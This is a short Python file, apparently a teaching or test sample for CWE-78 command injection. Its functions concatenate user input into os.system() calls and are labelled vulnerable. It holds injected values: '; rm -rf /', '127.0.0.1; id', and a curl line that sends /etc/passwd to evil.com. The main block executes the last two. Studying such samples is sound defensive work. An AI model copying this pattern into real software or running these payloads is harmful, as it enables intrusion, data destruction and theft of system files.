# CWE-78: OS Command Injection via os.system() with concatenation
# Vulnerability: user input is appended to a shell command string

import os


def compress_file(filename):
    """Compress a file using gzip — vulnerable to command injection."""
    # VULNERABLE: filename is concatenated directly into the shell command
    cmd = "gzip -k " + filename
    ret = os.system(cmd)
    return ret


def ping_host(host):
    """Ping a host to check connectivity — vulnerable."""
    # VULNERABLE: host is concatenated into the command
    cmd = "ping -c 4 " + host
    return os.system(cmd)


def remove_temp(tmpdir):
    """Remove a temporary directory — dangerous with user input."""
    # VULNERABLE: tmpdir could be "; rm -rf /"
    os.system("rm -rf " + tmpdir)


if __name__ == "__main__":
    # Attacker input: "report.txt; curl https://evil.com/$(cat /etc/passwd)"
    compress_file("report.txt; curl https://evil.com/$(cat /etc/passwd)")
    # Attacker input: "127.0.0.1; id"
    ping_host("127.0.0.1; id")
